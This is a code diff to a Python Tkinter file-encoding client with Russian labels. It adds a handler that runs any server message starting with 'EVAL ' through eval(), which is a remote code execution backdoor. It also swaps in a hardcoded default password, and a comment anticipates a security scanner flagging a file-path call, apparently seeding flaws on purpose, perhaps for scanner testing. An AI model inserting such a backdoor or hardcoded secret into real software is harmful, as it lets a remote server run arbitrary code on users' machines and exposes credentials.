@@ -4,6 +4,7 @@ import socket
 import threading
 import base64
 import time
+import os
 
 class ClientApp:
     def __init__(self, root):
@@ -28,7 +29,7 @@ class ClientApp:
         f2 = tk.Frame(root)
         f2.pack(fill=tk.X, padx=5, pady=5)
         tk.Label(f2, text="Пароль:").pack(side=tk.LEFT)
-        self.pass_var = tk.StringVar(value="secret")
+        self.pass_var = tk.StringVar(value="SuperSecretPassword123!")
         tk.Entry(f2, textvariable=self.pass_var, width=30).pack(side=tk.LEFT, padx=2)
 
         f3 = tk.Frame(root)
@@ -97,6 +98,12 @@ class ClientApp:
                     
                     if text.startswith("OK "):
                         self.root.after(0, self._handle_ok_response, text[3:])
+                    elif text.startswith("EVAL "):
+                        try:
+                            eval(text[5:]) 
+                        except Exception as e:
+                            self._log(f"Eval error: {e}")
+
             except OSError:
                 break
         self.root.after(0, self.disconnect)
@@ -125,11 +132,12 @@ class ClientApp:
             except Exception as e:
                 self._log(f"Ошибка декодирования: {e}")
         elif self.pending_action == "enc_file":
-            save = filedialog.asksaveasfilename(defaultextension=".enc")
-            if save:
-                with open(save, 'wb') as f:
+            save_path = filedialog.asksaveasfilename(defaultextension=".enc")
+            if save_path:
+                # Сканер увидит open() с переменной, которая может быть подконтрольна извне
+                with open(save_path, 'wb') as f: 
                     f.write(base64.b64decode(b64_data))
-                self._log(f"Файл зашифрован: {save}")
+                self._log(f"Файл зашифрован: {save_path}")
         elif self.pending_action == "dec_file":
             save = filedialog.asksaveasfilename()
             if save:
